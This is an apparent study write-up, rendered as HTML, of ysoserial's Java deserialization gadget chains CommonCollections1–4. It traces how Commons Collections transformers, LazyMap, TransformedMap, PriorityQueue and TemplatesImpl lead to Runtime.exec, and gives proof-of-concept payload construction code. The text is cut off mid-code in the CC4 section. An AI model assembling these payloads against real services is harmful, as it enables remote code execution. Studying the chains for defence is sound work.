+<h4 id="Using-LazyMap"><a href="#Using-LazyMap" class="headerlink" title="Using LazyMap"></a>Using <code>LazyMap</code></h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//Gadget chain:</span><br>ObjectInputStream.readObject()<br>	AnnotationInvocationHandler.readObject()<br>		Map(Proxy).entrySet()<br>			AnnotationInvocationHandler.invoke()<br>				LazyMap.get()<br>					ChainedTransformer.transform()<br>						ConstantTransformer.transform()<br>						InvokerTransformer.transform()<br>							Method.invoke()<br>								Class.getMethod()<br>						InvokerTransformer.transform()<br>							Method.invoke()<br>								Runtime.getRuntime()<br>						InvokerTransformer.transform()<br>							Method.invoke()<br>								Runtime.exec()<br></code></pre></td></tr></table></figure>
+
+<p>Use <code>AnnotationInvocationHandler</code> object(handler1) to trigger deserialize method <code>readObject</code>, it contains a dynamic proxy object for <code>Map</code> interface, another <code>AnnotationInvocationHandler</code> object(handler2) is contained in this <code>Proxy</code> object, handler2 contains a <code>LazyMap</code> armed with the evil transformer chain.<br>![[Pasted image 20231008190210.png|700]]</p>
+<p>Firstly, when a deserialize procession is started, in handler1’s <code>readObject</code>:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span>  <br>    <span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;  <br>    ObjectInputStream.<span class="hljs-type">GetField</span> <span class="hljs-variable">fields</span> <span class="hljs-operator">=</span> s.readFields();<br>    ...<br>    Map&lt;String, Object&gt; streamVals = (Map&lt;String,Object&gt;)fields.get(<span class="hljs-string">&quot;memberValues&quot;</span>, <span class="hljs-literal">null</span>);<br>	...<br>    <span class="hljs-keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : streamVals.entrySet()) &#123;  <br>	    <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> memberValue.getKey();  <br>	    <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;  <br>	    Class&lt;?&gt; memberType = memberTypes.get(name);  <br>	    <span class="hljs-keyword">if</span> (memberType != <span class="hljs-literal">null</span>) &#123;  <span class="hljs-comment">// i.e. member still exists  </span><br>	        value = memberValue.getValue();  <br>	        <span class="hljs-keyword">if</span> (!(memberType.isInstance(value) ||  <br>	              value <span class="hljs-keyword">instanceof</span> ExceptionProxy)) &#123;  <br>	            value = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationTypeMismatchExceptionProxy</span>(  <br>	                        objectToString(value))  <br>	                .setMember(annotationType.members().get(name));  <br>        &#125;  <br>    &#125;<br></code></pre></td></tr></table></figure>
+<p>Obtain <code>memberValues</code>(which is a <code>Proxy</code>) and call <code>entrySet()</code> on it. The proxy will employ its <code>InvocationHandler</code> member to trigger <code>invoke()</code> method with <em>entrySet</em> method as one of parameters. In handler2’s <code>invoke()</code>:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> &#123;  <br>    <span class="hljs-type">String</span> <span class="hljs-variable">member</span> <span class="hljs-operator">=</span> method.getName();<br>    ...<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> memberValues.get(member);  <br>	<span class="hljs-keyword">if</span> (result == <span class="hljs-literal">null</span>)  <br>	    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IncompleteAnnotationException</span>(type, member);<br>	...<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>As for handler2, <code>memberValues</code> is a <code>LazyMap</code> object with evil transformer chain, when its <code>get</code> is called, since there is no key like <em>entrySet</em> in this empty map, the transformer chain will be triggered as code below presents:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// LazyMap.java</span><br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">get</span><span class="hljs-params">(Object key)</span> &#123;  <br>    <span class="hljs-comment">// create value for key if key is not currently in the map  </span><br>    <span class="hljs-keyword">if</span> (map.containsKey(key) == <span class="hljs-literal">false</span>) &#123;  <br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> factory.transform(key);  <br>        map.put(key, value);  <br>        <span class="hljs-keyword">return</span> value;  <br>    &#125;  <br>    <span class="hljs-keyword">return</span> map.get(key);  <br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>The evil transformer chain is usually presented as:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">final</span> <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(  <br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>)&#125;);  <br><span class="hljs-comment">// real chain for after setup  </span><br><span class="hljs-keyword">final</span> Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;  <br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),  <br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;  <br>        String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;  <br>        <span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;),  <br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;  <br>        Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;  <br>        <span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]&#125;),  <br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,  <br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, execArgs),  <br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>)&#125;;<br><br>Reflections.setFieldValue(transformerChain, <span class="hljs-string">&quot;iTransformers&quot;</span>, transformers);<br></code></pre></td></tr></table></figure>
+<p>End.</p>
+<h4 id="Using-TransformedMap"><a href="#Using-TransformedMap" class="headerlink" title="Using TransformedMap"></a>Using <code>TransformedMap</code></h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//Gadget chain:</span><br>transform:<span class="hljs-number">121</span>, ChainedTransformer (org.apache.commons.collections.functors)  <br>checkSetValue:<span class="hljs-number">169</span>, TransformedMap (org.apache.commons.collections.map)  <br>setValue:<span class="hljs-number">191</span>, AbstractInputCheckedMapDecorator$MapEntry (org.apache.commons.collections.map)  <br>readObject:-<span class="hljs-number">1</span>, AnnotationInvocationHandler (sun.reflect.annotation)  <br>readObject:-<span class="hljs-number">1</span>, ObjectInputStream (java.io)<br></code></pre></td></tr></table></figure>
+
+<p>Look in <code>AnnotationInvocationHandler</code>‘s <code>readObject</code>:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span>  <br>    <span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;  <br>    ObjectInputStream.<span class="hljs-type">GetField</span> <span class="hljs-variable">fields</span> <span class="hljs-operator">=</span> s.readFields();<br>    ...<br>    <span class="hljs-type">AnnotationType</span> <span class="hljs-variable">annotationType</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;  <br>	<span class="hljs-keyword">try</span> &#123;  <br>	    annotationType = AnnotationType.getInstance(t);  <br>	&#125; <span class="hljs-keyword">catch</span>(IllegalArgumentException e) &#123;  <br>	    <span class="hljs-comment">// Class is no longer an annotation type; time to punch out  </span><br>	    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.InvalidObjectException(<span class="hljs-string">&quot;Non-annotation type in annotation serial stream&quot;</span>);  <br>	&#125;<br>	...<br>    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();<br>    ...<br>    Map&lt;String, Object&gt; streamVals = (Map&lt;String,Object&gt;)fields.get(<span class="hljs-string">&quot;memberValues&quot;</span>, <span class="hljs-literal">null</span>);<br>	...<br>    <span class="hljs-keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> memberValue.getKey();<br>            Class&lt;?&gt; memberType = memberTypes.get(name);<br>            <span class="hljs-keyword">if</span> (memberType != <span class="hljs-literal">null</span>) &#123;  <span class="hljs-comment">// i.e. member still exists</span><br>                <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> memberValue.getValue();<br>                <span class="hljs-keyword">if</span> (!(memberType.isInstance(value) ||<br>                      value <span class="hljs-keyword">instanceof</span> ExceptionProxy)) &#123;<br>                    memberValue.setValue(<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationTypeMismatchExceptionProxy</span>(<br>                            value.getClass() + <span class="hljs-string">&quot;[&quot;</span> + value + <span class="hljs-string">&quot;]&quot;</span>).setMember(<br>                                annotationType.members().get(name)));<br>                &#125;<br>            &#125;<br>        &#125;<br></code></pre></td></tr></table></figure>
+<p><code>AnnotationType.memberTypes()</code> will return the member name and type of specific annotation type, for <code>Target</code> annotation, its <code>memberTypes()</code> would return :</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-string">&quot;value&quot;</span>: class [Ljava.lang.annotation.ElementType;<br></code></pre></td></tr></table></figure>
+<p>There are two constraints in code above.</p>
+<ol>
+<li><code>streamVals</code>(which is a Map) should have an entry whose key exists in <code>annotationType</code>‘s <code>memberTypes</code> Map, for <code>Target</code>, it should be String <em>“value”</em>. Therefore, our <code>TransformedMap</code> should contain key <em>“value”</em>;</li>
+<li><code>memberValue</code> should not be the same type as the corresponding value of <code>streamVals</code>, i.e. the value of the entry in <code>TransformedMap</code> should not falls in either <code>java.lang.annotation.ElementType</code> nor <code>ExceptionProxy</code>.<br>Transformer chain would be triggered along with the call to <code>memberValue.setValue()</code></li>
+</ol>
+<p>Further, look into <code>TransformedMap</code>‘s <code>entrySet</code>(which backtracks to parent <code>AbstractInputCheckedMapDecorator</code>):</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Set <span class="hljs-title function_">entrySet</span><span class="hljs-params">()</span> &#123;  <br>    <span class="hljs-keyword">if</span> (isSetValueChecking()) &#123;  <br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EntrySet</span>(map.entrySet(), <span class="hljs-built_in">this</span>);  <br>    &#125; <span class="hljs-keyword">else</span> &#123;  <br>        <span class="hljs-keyword">return</span> map.entrySet();  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>Follow into <code>EntrySet</code>:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EntrySet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractSetDecorator</span> &#123;<br>	...<br>	<span class="hljs-keyword">public</span> Iterator <span class="hljs-title function_">iterator</span><span class="hljs-params">()</span> &#123;  <br>	    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EntrySetIterator</span>(collection.iterator(), parent);  <br>	&#125;<br>	...<br></code></pre></td></tr></table></figure>
+
+<p>In <code>EntrySetIterator</code>:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EntrySetIterator</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractIteratorDecorator</span> &#123;<br>	<span class="hljs-keyword">public</span> Object <span class="hljs-title function_">next</span><span class="hljs-params">()</span> &#123;  <br>	    Map.<span class="hljs-type">Entry</span> <span class="hljs-variable">entry</span> <span class="hljs-operator">=</span> (Map.Entry) iterator.next();  <br>	    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MapEntry</span>(entry, parent);  <br>	&#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>In <code>MapEntry</code>:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MapEntry</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractMapEntryDecorator</span> &#123;<br>	<span class="hljs-keyword">public</span> Object <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object value)</span> &#123;  <br>	    value = parent.checkSetValue(value);  <br>	    <span class="hljs-keyword">return</span> entry.setValue(value);  <br>	&#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>Look into <code>TransformedMap</code>‘s <code>checkSetValue</code>:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> Object <span class="hljs-title function_">checkSetValue</span><span class="hljs-params">(Object value)</span> &#123;  <br>    <span class="hljs-keyword">return</span> valueTransformer.transform(value);  <br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>As a result, when handler triggers <code>memberValue.setValue()</code>, control falls successively into the code chain above  and eventually trigger <code>transform</code> method.</p>
+<p>End.</p>
+<h3 id="CommonCollections2"><a href="#CommonCollections2" class="headerlink" title="CommonCollections2"></a>CommonCollections2</h3><blockquote>
+<p>[!NOTE] pre-requirements<br>JDK &lt;&#x3D; 1.7<br>commons-collections:commons-collections4:4.0</p>
+</blockquote>
+<p>The <code>TransformingComparator</code> transforms the objects before comparison.</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">compare</span><span class="hljs-params">(<span class="hljs-keyword">final</span> I obj1, <span class="hljs-keyword">final</span> I obj2)</span> &#123;<br>	<span class="hljs-keyword">final</span> <span class="hljs-type">O</span> <span class="hljs-variable">value1</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.transformer.transform(obj1);<br>	<span class="hljs-keyword">final</span> <span class="hljs-type">O</span> <span class="hljs-variable">value2</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.transformer.transform(obj2);<br>	<span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.decorated.compare(value1, value2);<br>&#125;<br></code></pre></td></tr></table></figure>
+<p><code>PriorityQueue</code> can employ <code>TransformingComparator</code> to sort objects. In <code>readObject()</code> method:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span>  <br>    <span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;<br>    ...<br>    heapify();<br>&#125;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">heapify</span><span class="hljs-params">()</span> &#123;  <br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> (size &gt;&gt;&gt; <span class="hljs-number">1</span>) - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--)  <br>        siftDown(i, (E) queue[i]);  <br>&#125;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">siftDown</span><span class="hljs-params">(<span class="hljs-type">int</span> k, E x)</span> &#123;  <br>    <span class="hljs-keyword">if</span> (comparator != <span class="hljs-literal">null</span>)  <br>        siftDownUsingComparator(k, x);  <br>    <span class="hljs-keyword">else</span>        siftDownComparable(k, x);  <br>&#125;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">siftDownUsingComparator</span><span class="hljs-params">(<span class="hljs-type">int</span> k, E x)</span> &#123;  <br>    <span class="hljs-type">int</span> <span class="hljs-variable">half</span> <span class="hljs-operator">=</span> size &gt;&gt;&gt; <span class="hljs-number">1</span>;  <br>    <span class="hljs-keyword">while</span> (k &lt; half) &#123;  <br>        ...<br>        <span class="hljs-keyword">if</span> (right &lt; size &amp;&amp;  <br>            comparator.compare((E) c, (E) queue[right]) &gt; <span class="hljs-number">0</span>)  <br>            c = queue[child = right];  <br>        <span class="hljs-keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="hljs-number">0</span>)  <br>            <span class="hljs-keyword">break</span>;  <br>        ...<br>    &#125;  <br>    ...  <br>&#125;<br></code></pre></td></tr></table></figure>
+<p>Insert a <code>TemplatesImpl</code> object into priority queue and use an <code>InvokerTranformer</code> configured with <code>newTransformer</code> method to decorate the comparator. While deserialization the queue, the <code>newTransformer</code> method of <code>TemplatesImpl</code> is called and arbitrary code is executed.</p>
+<p>Poc:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> Gadgets.createTemplatesImpl(command);  <br><span class="hljs-comment">// mock method name until armed  </span><br><span class="hljs-keyword">final</span> <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">transformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;toString&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>], <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]);  <br>  <br><span class="hljs-comment">// create queue with numbers and basic comparator  </span><br><span class="hljs-keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;Object&gt;(<span class="hljs-number">2</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(transformer));  <br><span class="hljs-comment">// stub data for replacement later  </span><br>queue.add(<span class="hljs-number">1</span>);  <br>queue.add(<span class="hljs-number">1</span>);  <br>  <br><span class="hljs-comment">// switch method called by comparator  </span><br>Reflections.setFieldValue(transformer, <span class="hljs-string">&quot;iMethodName&quot;</span>, <span class="hljs-string">&quot;newTransformer&quot;</span>);  <br>  <br><span class="hljs-comment">// switch contents of queue  </span><br><span class="hljs-keyword">final</span> Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, <span class="hljs-string">&quot;queue&quot;</span>);  <br>queueArray[<span class="hljs-number">0</span>] = templates;  <br>queueArray[<span class="hljs-number">1</span>] = <span class="hljs-number">1</span>;<br><br><span class="hljs-keyword">return</span> queue;<br></code></pre></td></tr></table></figure>
+
+
+<h3 id="CommonCollections3"><a href="#CommonCollections3" class="headerlink" title="CommonCollections3"></a>CommonCollections3</h3><blockquote>
+<p>A variant of CC1, replace <code>InvokerTransformer</code> by <code>InstantiateTransformer</code></p>
+</blockquote>
+<blockquote>
+<p>[!NOTE] pre-requirements<br>JDK &lt;&#x3D; 7u21, reproduce on jdk7u21<br>commons-collections:commons-collections:3.1</p>
+</blockquote>
+<p>As [[Java Deserialize Vulnerabilities ysoserial study#TemplatesImpl exploit|this section]] presents, <code>TemplatesImpl</code>‘s <code>newTransformer</code> exposes an approach to loading arbitrary byte code.</p>
+<p>Seek for reference of <code>TemplatesImpl</code>‘s <code>newTransformer</code> method, find in <code>TrAXFilter</code>‘s constructor:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">TrAXFilter</span><span class="hljs-params">(Templates templates)</span>  <span class="hljs-keyword">throws</span>  <br>    TransformerConfigurationException  <br>&#123;  <br>    _templates = templates;  <br>    _transformer = (TransformerImpl) templates.newTransformer();  <br>    _transformerHandler = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerHandlerImpl</span>(_transformer);  <br>    _useServicesMechanism = _transformer.useServicesMechnism();  <br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>Immediately after [[Java Deserialize Vulnerabilities ysoserial study#Proof of Concept|this code section]], proof concept above by code below:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">...<br><span class="hljs-type">Class</span> <span class="hljs-variable">cls</span> <span class="hljs-operator">=</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter.class;  <br><span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> cls.getDeclaredConstructor(Templates.class);  <br>constructor.setAccessible(<span class="hljs-literal">true</span>);  <br>constructor.newInstance(templates); <span class="hljs-comment">// templates is TemplatesImpl type</span><br></code></pre></td></tr></table></figure>
+
+<p>This routine can be translated into the form of transformers, by introducing <code>InstantiateTransformer</code>:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">final</span> Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;  <br>      <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),  <br>      <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(  <br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; Templates.class &#125;,  <br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; templates &#125; )&#125;;<br></code></pre></td></tr></table></figure>
+
+<p>Use whichever payload in [[Java Deserialize Vulnerabilities ysoserial study#CommonCollections1|CC1]] to reach the eventual payload.</p>
+<p>End.</p>
+<h3 id="CommonCollections4"><a href="#CommonCollections4" class="headerlink" title="CommonCollections4"></a>CommonCollections4</h3><blockquote>
+<p>[!NOTE] pre-requirements<br>JDK &lt;&#x3D; 1.7<br>commons-collections:commons-collections:4.0</p>
+</blockquote>
+<p>This payload uses the same vulnerability as [[Java Deserialize Vulnerabilities ysoserial study#CommonCollections2|CC2]] but uses a different exploit chain.<br>Specifically, this payload uses <code>TrAXFilter</code>, triggers transformer from its constructor.<br>Poc:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Object</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> Gadgets.createTemplatesImpl(command);  <br>  <br><span class="hljs-type">ConstantTransformer</span> <span class="hljs-variable">constant</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(String.class);  <br>  <br><span class="hljs-comment">// mock method name until armed  </span><br>Class[] paramTypes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; String.class &#125;;  <br>Object[] args = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; <span 